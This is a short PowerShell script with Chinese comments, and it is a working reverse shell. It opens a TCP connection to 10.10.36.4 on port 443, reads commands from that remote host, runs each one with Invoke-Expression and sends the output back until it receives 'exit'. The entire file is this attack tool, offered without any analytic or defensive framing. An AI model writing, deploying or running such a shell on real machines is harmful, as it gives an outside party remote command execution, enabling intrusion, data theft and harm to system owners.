# 設定目標 IP 與 Port
$RemoteHost = "10.10.36.4"
$RemotePort = 443

try {
    # 建立 TcpClient 並嘗試連線
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($RemoteHost, $RemotePort)

    # 初始化串流讀寫器
    $stream  = $client.GetStream()
    $reader  = New-Object System.IO.StreamReader($stream)
    $writer  = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    # 持續接收並執行指令
    while ($true) {
        try {
            $command = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($command)) { break }
            if ($command -eq "exit") { break }

            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
            } catch {
                $output = "執行錯誤: $($_.Exception.Message)"
            }

            $writer.WriteLine($output)
        } catch {
            Write-Host "⚠️ 無法讀取指令，可能連線中斷: $($_.Exception.Message)"
            break
        }
    }
} catch {
    Write-Host "❌ 連線失敗: $($_.Exception.Message)"
} finally {
    if ($writer) { $writer.Close() }
    if ($reader) { $reader.Close() }
    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
}